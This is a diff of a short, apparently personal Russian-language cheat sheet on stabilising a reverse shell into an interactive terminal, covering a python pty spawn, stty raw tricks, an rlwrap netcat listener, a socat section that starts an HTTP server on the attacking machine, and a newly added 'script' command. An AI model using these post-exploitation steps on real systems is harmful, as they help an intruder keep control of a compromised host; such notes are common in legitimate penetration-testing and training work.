@@ -1,5 +1,4 @@
-#a. python
-/\*
+# Python
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm
 export SHELL=bash
@@ -8,16 +7,16 @@ Ctrl+Z
 stty raw -echo; fg
 
 enter x2
-\*/
 
-#b. rlwrap ( в основном windows)
+
+# rlwrap ( в основном windows)
 
 rlwrap nc -lvnp <port>
 Ctrl+Z
 stty raw -echo; fg
 enter x2
 
-#c. socat
+# socat
 
 Атакующая машина: sudo python3 -m http.server 80
 Целевая машина:
@@ -29,3 +28,6 @@ stty -a в другом терминале для получения необх�
 в reverse shell терминале:
 stty rows <number>
 stty cols <number>
+
+# script
+script -qc /bin/bash /dev/null
